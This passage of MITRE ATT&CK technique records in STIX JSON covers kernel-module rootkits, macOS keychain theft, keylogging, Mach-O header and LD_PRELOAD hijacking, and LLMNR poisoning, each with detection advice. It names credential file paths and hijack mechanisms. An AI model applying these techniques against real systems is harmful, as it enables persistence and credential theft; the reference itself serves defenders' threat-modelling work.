2015)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_system_requirements\":[\"Valid domain account or the ability to sniff traffic within a domain\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2018-04-18T17:59:24.739Z\",\"external_references\":[{\"external_id\":\"T1215\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1215\"},{\"description\":\"Pomerantz, O., Salzman, P.. (2003, April 4). The Linux Kernel Module Programming Guide. Retrieved April 6, 2018.\",\"source_name\":\"Linux Kernel Programming\",\"url\":\"https://www.tldp.org/LDP/lkmpg/2.4/lkmpg.pdf\"},{\"description\":\"Pomerantz, O., Salzman, P. (2003, April 4). Modules vs Programs. Retrieved April 6, 2018.\",\"source_name\":\"Linux Kernel Module Programming Guide\",\"url\":\"http://www.tldp.org/LDP/lkmpg/2.4/html/x437.html\"},{\"description\":\"Case, A. (2012, October 10). Phalanx 2 Revealed: Using Volatility to Analyze an Advanced Linux Rootkit. Retrieved April 9, 2018.\",\"source_name\":\"Volatility Phalanx2\",\"url\":\"https://volatility-labs.blogspot.com/2012/10/phalanx-2-revealed-using-volatility-to.html\"},{\"description\":\"Kurtz, G. (2012, November 19). HTTP iframe Injecting Linux Rootkit. Retrieved December 21, 2017.\",\"source_name\":\"CrowdStrike Linux Rootkit\",\"url\":\"https://www.crowdstrike.com/blog/http-iframe-injecting-linux-rootkit/\"},{\"description\":\"Augusto, I. (2018, March 8). Reptile - LMK Linux rootkit. Retrieved April 9, 2018.\",\"source_name\":\"GitHub Reptile\",\"url\":\"https://github.com/f0rb1dd3n/Reptile\"},{\"description\":\"Mello, V. (2018, March 8). Diamorphine - LMK rootkit for Linux Kernels 2.6.x/3.x/4.x (x86 and x86_64). Retrieved April 9, 2018.\",\"source_name\":\"GitHub Diamorphine\",\"url\":\"https://github.com/m0nad/Diamorphine\"},{\"description\":\"Chuvakin, A. (2003, February). An Overview of Rootkits. Retrieved April 6, 2018.\",\"source_name\":\"iDefense Rootkit Overview\",\"url\":\"http://www.megasecurity.org/papers/Rootkits.pdf\"},{\"description\":\"Wardle, P. (2015, April). Malware Persistence on OS X Yosemite. Retrieved April 6, 2018.\",\"source_name\":\"RSAC 2015 San Francisco Patrick Wardle\",\"url\":\"https://www.rsaconference.com/writable/presentations/file_upload/ht-r03-malware-persistence-on-os-x-yosemite_final.pdf\"},{\"description\":\"Wardle, P. (2017, September 8). High Sierra’s ‘Secure Kernel Extension Loading’ is Broken. Retrieved April 6, 2018.\",\"source_name\":\"Synack Secure Kernel Extension Broken\",\"url\":\"https://www.synack.com/2017/09/08/high-sierras-secure-kernel-extension-loading-is-broken/\"},{\"description\":\"Mikhail, K. (2014, October 16). The Ventir Trojan: assemble your MacOS spy. Retrieved April 6, 2018.\",\"source_name\":\"Securelist Ventir\",\"url\":\"https://securelist.com/the-ventir-trojan-assemble-your-macos-spy/67267/\"},{\"description\":\"Wikipedia. (2018, March 17). Loadable kernel module. Retrieved April 9, 2018.\",\"source_name\":\"Wikipedia Loadable Kernel Module\",\"url\":\"https://en.wikipedia.org/wiki/Loadable_kernel_module#Linux\"},{\"description\":\"Henderson, B. (2006, September 24). How To Insert And Remove LKMs. Retrieved April 9, 2018.\",\"source_name\":\"Linux Loadable Kernel Module Insert and Remove LKMs\",\"url\":\"http://tldp.org/HOWTO/Module-HOWTO/x197.html\"}],\"id\":\"attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5\",\"modified\":\"2020-01-24T17:57:51.019Z\",\"name\":\"Kernel Modules and Extensions\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-24T17:42:23.339Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may modify the kernel to automatically execute programs on system boot. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u{a0}\\n\\nWhen used maliciously, LKMs can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u{a0}Common features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\\n\\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands.\\n\\nAdversaries can use LKMs and kexts to covertly persist on a system and elevate privileges. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)(Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken)(Citation: Securelist Ventir) (Citation: Trend Micro Skidmap)\",\"external_references\":[{\"external_id\":\"T1547.006\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1547/006\"},{\"description\":\"Pomerantz, O., Salzman, P.. (2003, April 4). The Linux Kernel Module Programming Guide. Retrieved April 6, 2018.\",\"source_name\":\"Linux Kernel Programming\",\"url\":\"https://www.tldp.org/LDP/lkmpg/2.4/lkmpg.pdf\"},{\"description\":\"Pomerantz, O., Salzman, P. (2003, April 4). Modules vs Programs. Retrieved April 6, 2018.\",\"source_name\":\"Linux Kernel Module Programming Guide\",\"url\":\"http://www.tldp.org/LDP/lkmpg/2.4/html/x437.html\"},{\"description\":\"Chuvakin, A. (2003, February). An Overview of Rootkits. Retrieved April 6, 2018.\",\"source_name\":\"iDefense Rootkit Overview\",\"url\":\"http://www.megasecurity.org/papers/Rootkits.pdf\"},{\"description\":\"Case, A. (2012, October 10). Phalanx 2 Revealed: Using Volatility to Analyze an Advanced Linux Rootkit. Retrieved April 9, 2018.\",\"source_name\":\"Volatility Phalanx2\",\"url\":\"https://volatility-labs.blogspot.com/2012/10/phalanx-2-revealed-using-volatility-to.html\"},{\"description\":\"Kurtz, G. (2012, November 19). HTTP iframe Injecting Linux Rootkit. Retrieved December 21, 2017.\",\"source_name\":\"CrowdStrike Linux Rootkit\",\"url\":\"https://www.crowdstrike.com/blog/http-iframe-injecting-linux-rootkit/\"},{\"description\":\"Augusto, I. (2018, March 8). Reptile - LMK Linux rootkit. Retrieved April 9, 2018.\",\"source_name\":\"GitHub Reptile\",\"url\":\"https://github.com/f0rb1dd3n/Reptile\"},{\"description\":\"Mello, V. (2018, March 8). Diamorphine - LMK rootkit for Linux Kernels 2.6.x/3.x/4.x (x86 and x86_64). Retrieved April 9, 2018.\",\"source_name\":\"GitHub Diamorphine\",\"url\":\"https://github.com/m0nad/Diamorphine\"},{\"description\":\"Wardle, P. (2015, April). Malware Persistence on OS X Yosemite. Retrieved April 6, 2018.\",\"source_name\":\"RSAC 2015 San Francisco Patrick Wardle\",\"url\":\"https://www.rsaconference.com/writable/presentations/file_upload/ht-r03-malware-persistence-on-os-x-yosemite_final.pdf\"},{\"description\":\"Wardle, P. (2017, September 8). High Sierra’s ‘Secure Kernel Extension Loading’ is Broken. Retrieved April 6, 2018.\",\"source_name\":\"Synack Secure Kernel Extension Broken\",\"url\":\"https://www.synack.com/2017/09/08/high-sierras-secure-kernel-extension-loading-is-broken/\"},{\"description\":\"Mikhail, K. (2014, October 16). The Ventir Trojan: assemble your MacOS spy. Retrieved April 6, 2018.\",\"source_name\":\"Securelist Ventir\",\"url\":\"https://securelist.com/the-ventir-trojan-assemble-your-macos-spy/67267/\"},{\"description\":\"Remillano, A., Urbanec, J. (2019, September 19). Skidmap Linux Malware Uses Rootkit Capabilities to Hide Cryptocurrency-Mining Payload. Retrieved June 4, 2020.\",\"source_name\":\"Trend Micro Skidmap\",\"url\":\"https://blog.trendmicro.com/trendlabs-security-intelligence/skidmap-linux-malware-uses-rootkit-capabilities-to-hide-cryptocurrency-mining-payload/\"},{\"description\":\"Henderson, B. (2006, September 24). How To Insert And Remove LKMs. Retrieved April 9, 2018.\",\"source_name\":\"Linux Loadable Kernel Module Insert and Remove LKMs\",\"url\":\"http://tldp.org/HOWTO/Module-HOWTO/x197.html\"},{\"description\":\"Wikipedia. (2018, March 17). Loadable kernel module. Retrieved April 9, 2018.\",\"source_name\":\"Wikipedia Loadable Kernel Module\",\"url\":\"https://en.wikipedia.org/wiki/Loadable_kernel_module#Linux\"}],\"id\":\"attack-pattern--a1b52199-c8c5-438a-9ded-656f1d0888c6\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-06-30T21:23:15.188Z\",\"name\":\"Kernel Modules and Extensions\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Anastasios Pingios\",\"Jeremy Galloway\",\"Red Canary\"],\"x_mitre_data_sources\":[\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_detection\":\"Loading, unloading, and manipulating modules on Linux systems can be detected by monitoring for the following commands:<code>modprobe</code>, <code>insmod</code>, <code>lsmod</code>, <code>rmmod</code>, or <code>modinfo</code> (Citation: Linux Loadable Kernel Module Insert and Remove LKMs) LKMs are typically loaded into <code>/lib/modules</code> and have had the extension .ko (\\\"kernel object\\\") since version 2.6 of the Linux kernel. (Citation: Wikipedia Loadable Kernel Module)\\n\\nFor macOS, monitor for execution of <code>kextload</code> commands and correlate with other unknown or suspicious activity.\\n\\nAdversaries may run commands on the target system before loading a malicious module in order to ensure that it is properly compiled. (Citation: iDefense Rootkit Overview) Adversaries may also execute commands to identify the exact version of the running Linux kernel and/or download multiple versions of the same .ko (kernel object) files to use the one appropriate for the running system.(Citation: Trend Micro Skidmap) Many LKMs require Linux headers (specific to the target kernel) in order to compile properly.\u{a0}These are typically obtained through the operating systems package manager and installed like a normal package. On Ubuntu and Debian based systems this can be accomplished by running: <code>apt-get install linux-headers-$(uname -r)</code> On RHEL and CentOS based systems this can be accomplished by running: <code>yum install kernel-devel-$(uname -r)</code>\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"root\"],\"x_mitre_platforms\":[\"macOS\",\"Linux\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-12-14T16:46:06.044Z\",\"external_references\":[{\"external_id\":\"T1142\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1142\"},{\"description\":\"Wikipedia. (n.d.). Keychain (software). Retrieved July 5, 2017.\",\"source_name\":\"Wikipedia keychain\",\"url\":\"https://en.wikipedia.org/wiki/Keychain_(software)\"},{\"description\":\"Alex Rymdeko-Harvey, Steve Borosh. (2016, May 14). External to DA, the OS X Way. Retrieved July 3, 2017.\",\"source_name\":\"External to DA, the OS X Way\",\"url\":\"http://www.slideshare.net/StephanBorosh/external-to-da-the-os-x-way\"}],\"id\":\"attack-pattern--9e09ddb2-1746-4448-9cad-7f8b41777d6d\",\"modified\":\"2020-02-12T18:55:55.305Z\",\"name\":\"Keychain\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-02-12T18:55:24.728Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may collect the keychain storage data from a system to acquire credentials. Keychains are the built-in way for macOS to keep track of users\' passwords and credentials for many services and features such as WiFi passwords, websites, secure notes, certificates, and Kerberos. Keychain files are located in <code>~/Library/Keychains/</code>,<code>/Library/Keychains/</code>, and <code>/Network/Library/Keychains/</code>. (Citation: Wikipedia keychain) The <code>security</code> command-line utility, which is built into macOS by default, provides a useful way to manage these credentials.\\n\\nTo manage their credentials, users have to use additional credentials to access their keychain. If an adversary knows the credentials for the login keychain, then they can get access to all the other credentials stored in this vault. (Citation: External to DA, the OS X Way) By default, the passphrase for the keychain is the user’s logon credentials.\",\"external_references\":[{\"external_id\":\"T1555.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1555/001\"},{\"description\":\"Wikipedia. (n.d.). Keychain (software). Retrieved July 5, 2017.\",\"source_name\":\"Wikipedia keychain\",\"url\":\"https://en.wikipedia.org/wiki/Keychain_(software)\"},{\"description\":\"Alex Rymdeko-Harvey, Steve Borosh. (2016, May 14). External to DA, the OS X Way. Retrieved July 3, 2017.\",\"source_name\":\"External to DA, the OS X Way\",\"url\":\"http://www.slideshare.net/StephanBorosh/external-to-da-the-os-x-way\"}],\"id\":\"attack-pattern--1eaebf46-e361-4437-bc23-d5d65a3b92e3\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"credential-access\"}],\"modified\":\"2020-02-17T13:14:31.140Z\",\"name\":\"Keychain\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"PowerShell logs\",\"Process monitoring\",\"File monitoring\",\"System calls\",\"API monitoring\"],\"x_mitre_detection\":\"Unlocking the keychain and using passwords from it is a very common process, so there is likely to be a lot of noise in any detection technique. Monitoring of system calls to the keychain can help determine if there is a suspicious process trying to access it.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\"],\"x_mitre_platforms\":[\"macOS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-11T18:58:11.791Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured.\\n\\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods include:\\n\\n* Hooking API callbacks used for processing keystrokes. Unlike [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004), this focuses solely on API functions intended for processing keystroke data.\\n* Reading raw keystroke data from the hardware buffer.\\n* Windows Registry modifications.\\n* Custom drivers.\",\"external_references\":[{\"external_id\":\"T1056.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1056/001\"},{\"external_id\":\"CAPEC-568\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/568.html\"},{\"description\":\"Tinaztepe,  E. (n.d.). The Adventures of a Keystroke:  An in-depth look into keyloggers on Windows. Retrieved April 27, 2016.\",\"source_name\":\"Adventures of a Keystroke\",\"url\":\"http://opensecuritytraining.info/Keylogging_files/The%20Adventures%20of%20a%20Keystroke.pdf\"}],\"id\":\"attack-pattern--09a60ea3-a8d1-4ae5-976e-5783248b72a4\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"collection\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"credential-access\"}],\"modified\":\"2020-03-24T20:45:52.998Z\",\"name\":\"Keylogging\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Windows Registry\",\"Process monitoring\",\"API monitoring\"],\"x_mitre_detection\":\"Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include `SetWindowsHook`, `GetKeyState`, and `GetAsyncKeyState`.(Citation: Adventures of a Keystroke) Monitor the Registry and file system for such changes, monitor driver installs, and look for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\",\"root\",\"SYSTEM\",\"User\"],\"x_mitre_platforms\":[\"Windows\",\"macOS\",\"Linux\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-12-14T16:46:06.044Z\",\"external_references\":[{\"external_id\":\"T1161\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1161\"},{\"description\":\"Patrick Wardle. (2015). Writing Bad @$$ Malware for OS X. Retrieved July 10, 2017.\",\"source_name\":\"Writing Bad Malware for OSX\",\"url\":\"https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf\"},{\"description\":\"Patrick Wardle. (2015). Malware Persistence on OS X Yosemite. Retrieved July 10, 2017.\",\"source_name\":\"Malware Persistence on OS X\",\"url\":\"https://www.rsaconference.com/writable/presentations/file_upload/ht-r03-malware-persistence-on-os-x-yosemite_final.pdf\"}],\"id\":\"attack-pattern--04ef4356-8926-45e2-9441-634b6f3dcecb\",\"modified\":\"2020-01-24T14:22:27.531Z\",\"name\":\"LC_LOAD_DYLIB Addition\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-24T14:21:52.750Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries. Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long as adjustments are made to the rest of the fields and dependencies. (Citation: Writing Bad Malware for OSX) There are tools available to perform these changes.\\n\\nAdversaries may modify Mach-O binary headers to load and execute malicious dylibs every time the binary is executed. Although any changes will invalidate digital signatures on binaries because the binary is being modified, this can be remediated by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn’t checked at load time. (Citation: Malware Persistence on OS X)\",\"external_references\":[{\"external_id\":\"T1546.006\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1546/006\"},{\"description\":\"Patrick Wardle. (2015). Writing Bad @$$ Malware for OS X. Retrieved July 10, 2017.\",\"source_name\":\"Writing Bad Malware for OSX\",\"url\":\"https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf\"},{\"description\":\"Patrick Wardle. (2015). Malware Persistence on OS X Yosemite. Retrieved July 10, 2017.\",\"source_name\":\"Malware Persistence on OS X\",\"url\":\"https://www.rsaconference.com/writable/presentations/file_upload/ht-r03-malware-persistence-on-os-x-yosemite_final.pdf\"}],\"id\":\"attack-pattern--10ff21b9-5a01-4268-a1b5-3b55015f1847\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"}],\"modified\":\"2020-03-24T16:50:36.235Z\",\"name\":\"LC_LOAD_DYLIB Addition\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"File monitoring\",\"Process command-line parameters\",\"Process monitoring\",\"Binary file metadata\"],\"x_mitre_detection\":\"Monitor processes for those that may be used to modify binary headers. Monitor file systems for changes to application binaries and invalid checksums/signatures. Changes to binaries that do not line up with application updates or patches are also extremely suspicious.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"macOS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-12-14T16:46:06.044Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"**This technique has been deprecated and should no longer be used.**\\n\\nAs of OS X 10.8, mach-O binaries introduced a new header called LC_MAIN that points to the binary’s entry point for execution. Previously, there were two headers to achieve this same effect: LC_THREAD and LC_UNIXTHREAD  (Citation: Prolific OSX Malware History). The entry point for a binary can be hijacked so that initial execution flows to a malicious addition (either another section or a code cave) and then goes back to the initial entry point so that the victim doesn’t know anything was different  (Citation: Methods of Mac Malware Persistence). By modifying a binary in this way, application whitelisting can be bypassed because the file name or application path is still the same.\",\"external_references\":[{\"external_id\":\"T1149\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1149\"},{\"description\":\"Bit9 + Carbon Black Threat Research Team. (2015). 2015: The Most Prolific Year in History for OS X Malware. Retrieved July 8, 2017.\",\"source_name\":\"Prolific OSX Malware History\",\"url\":\"https://assets.documentcloud.org/documents/2459197/bit9-carbon-black-threat-research-report-2015.pdf\"},{\"description\":\"Patrick Wardle. (2014, September). Methods of Malware Persistence on Mac OS X. Retrieved July 5, 2017.\",\"source_name\":\"Methods of Mac Malware Persistence\",\"url\":\"https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf\"}],\"id\":\"attack-pattern--a0a189c8-d3bd-4991-bf6f-153d185ee373\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-03-30T13:53:57.518Z\",\"name\":\"LC_MAIN Hijacking\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Binary file metadata\",\"Malware reverse engineering\",\"Process monitoring\"],\"x_mitre_defense_bypassed\":[\"Application whitelisting\",\"Process whitelisting\",\"Whitelisting by file name or path\"],\"x_mitre_deprecated\":true,\"x_mitre_detection\":\"Determining the original entry point for a binary is difficult, but checksum and signature verification is very possible. Modifying the LC_MAIN entry point or adding in an additional LC_MAIN entry point invalidates the signature for the file and can be detected. Collect running process information and compare against known applications to look for suspicious behavior.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\",\"Administrator\"],\"x_mitre_platforms\":[\"macOS\"],\"x_mitre_version\":\"2.0\"}",
    "{\"created\":\"2020-03-13T20:09:59.569Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may execute their own malicious payloads by hijacking the dynamic linker used to load libraries. The dynamic linker is used to load shared library dependencies needed by an executing program. The dynamic linker will typically check provided absolute paths and common directories for these dependencies, but can be overridden by shared objects specified by LD_PRELOAD to be loaded before all others.(Citation: Man LD.SO)(Citation: TLDP Shared Libraries)\\n\\nAdversaries may set LD_PRELOAD to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary\'s malicious code upon execution of the victim program. LD_PRELOAD can be set via the environment variable or <code>/etc/ld.so.preload</code> file.(Citation: Man LD.SO)(Citation: TLDP Shared Libraries) Libraries specified by LD_PRELOAD with be loaded and mapped into memory by <code>dlopen()</code> and <code>mmap()</code> respectively.(Citation: Code Injection on Linux and macOS) (Citation: Uninformed Needle) (Citation: Phrack halfdead 1997)\\n\\nLD_PRELOAD hijacking may grant access to the victim process\'s memory, system/network resources, and possibly elevated privileges. Execution via LD_PRELOAD hijacking may also evade detection from security products since the execution is masked under a legitimate process.\",\"external_references\":[{\"external_id\":\"T1574.006\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1574/006\"},{\"description\":\"Kerrisk, M. (2020, June 13). Linux Programmer\'s Manual. Retrieved June 15, 2020.\",\"source_name\":\"Man LD.SO\",\"url\":\"https://www.man7.org/linux/man-pages/man8/ld.so.8.html\"},{\"description\":\"The Linux Documentation Project. (n.d.). Shared Libraries. Retrieved January 31, 2020.\",\"source_name\":\"TLDP Shared Libraries\",\"url\":\"https://www.tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html\"},{\"description\":\"Itamar Turner-Trauring. (2017, April 18). “This will only hurt for a moment”: code injection on Linux and macOS with LD_PRELOAD. Retrieved December 20, 2017.\",\"source_name\":\"Code Injection on Linux and macOS\",\"url\":\"https://www.datawire.io/code-injection-on-linux-and-macos/\"},{\"description\":\"skape. (2003, January 19). Linux x86 run-time process manipulation. Retrieved December 20, 2017.\",\"source_name\":\"Uninformed Needle\",\"url\":\"http://hick.org/code/skape/papers/needle.txt\"},{\"description\":\"halflife. (1997, September 1). Shared Library Redirection Techniques. Retrieved December 20, 2017.\",\"source_name\":\"Phrack halfdead 1997\",\"url\":\"http://phrack.org/issues/51/8.html\"}],\"id\":\"attack-pattern--633a100c-b2c9-41bf-9be5-905c1b16c825\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-06-15T21:59:25.358Z\",\"name\":\"LD_PRELOAD\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\",\"File monitoring\",\"Environment variable\"],\"x_mitre_detection\":\"Monitor for changes to environment variables and files associated with loading shared libraries such as LD_PRELOAD, as well as the commands to implement these changes.\\n\\nMonitor processes for unusual activity (e.g., a process that does not use the network begins to do so). Track library metadata, such as a hash, and compare libraries that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2018-01-16T16:13:52.465Z\",\"external_references\":[{\"external_id\":\"T1171\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1171\"},{\"description\":\"Wikipedia. (2016, July 7). Link-Local Multicast Name Resolution. Retrieved November 17, 2017.\",\"source_name\":\"Wikipedia LLMNR\",\"url\":\"https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution\"},{\"description\":\"Microsoft. (n.d.). NetBIOS Name Resolution. Retrieved November 17, 2017.\",\"source_name\":\"TechNet NetBIOS\",\"url\":\"https://technet.microsoft.com/library/cc958811.aspx\"},{\"description\":\"Salvati, M. (2017, June 2). Practical guide to NTLM Relaying in 2017 (A.K.A getting a foothold in under 5 minutes). Retrieved February 7, 2019.\",\"source_name\":\"byt3bl33d3r NTLM Relaying\",\"url\":\"https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html\"},{\"description\":\"Kuehn, E. (2018, April 11). Ever Run a Relay? Why SMB Relays Should Be On Your Mind. Retrieved February 7, 2019.\",\"source_name\":\"Secure Ideas SMB Relay\",\"url\":\"https://blog.secureideas.com/2018/04/ever-run-a-relay-why-smb-relays-should-be-on-your-mind.html\"},{\"description\":\"Nomex. (2014, February 7). NBNSpoof. Retrieved November 17, 2017.\",\"source_name\":\"GitHub NBNSpoof\",\"url\":\"https://github.com/nomex/nbnspoof\"},{\"description\":\"Francois, R. (n.d.). LLMNR Spoofer. Retrieved November 17, 2017.\",\"source_name\":\"Rapid7 LLMNR Spoofer\",\"url\":\"https://www.rapid7.com/db/modules/auxiliary/spoof/llmnr/llmnr_response\"},{\"description\":\"Gaffie, L. (2016, August 25). Responder. Retrieved November 17, 2017.\",\"source_name\":\"GitHub Responder\",\"url\":\"https://github.com/SpiderLabs/Responder\"},{\"description\":\"Sternstein, J. (2013, November). Local Network Attacks: LLMNR and NBT-NS Poisoning. Retrieved November 17, 2017.\",\"source_name\":\"Sternsecurity LLMNR-NBTNS\",\"url\":\"https://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning\"},{\"description\":\"Robertson, K. (2016, August 28). Conveigh. Retrieved November 17, 2017.\",\"source_name\":\"GitHub Conveigh\",\"url\":\"https://github.com/Kevin-Robertson/Conveigh\"}],\"id\":\"attack-pattern--0dbf5f1b-a560-4d51-ac1b-d70caab3e1f0\",\"modified\":\"2020-02-11T19:09:48.452Z\",\"name\":\"LLMNR/NBT-NS Poisoning and Relay\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-02-11T19:08:51.677Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials. \\n\\nLink-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS)\\n\\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. (Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay)\\n\\nSeveral tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and 